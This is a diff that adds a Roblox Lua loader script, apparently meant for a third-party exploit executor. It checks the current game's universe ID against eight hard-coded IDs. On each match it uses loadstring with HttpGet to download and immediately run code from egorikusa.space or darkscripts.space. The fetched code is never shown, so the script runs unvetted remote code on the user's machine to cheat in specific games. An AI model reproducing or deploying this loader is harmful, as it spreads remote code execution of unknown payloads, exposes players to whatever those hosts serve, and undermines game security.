@@ -1,0 +1,45 @@
+repeat
+    task.wait()
+until game.GameId ~= nil
+repeat
+    task.wait()
+until game:IsLoaded()
+
+if getgenv().loaded then
+    return
+end
+getgenv().loaded = true
+
+universeid = game.GameId
+
+if universeid == 383310974 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 3317771874 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 4778845442 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 66654135 then
+    loadstring(game:HttpGet("https://darkscripts.space/scripts/cd9b0b7249.lua", true))()
+end
+
+if universeid == 2316994223 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 1008451066 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 4777817887 then
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
+
+if universeid == 5836869368 then 
+    loadstring(game:HttpGet("https://egorikusa.space/3b533f65c5a3f4c80fd2a7ef.lua", true))()
+end
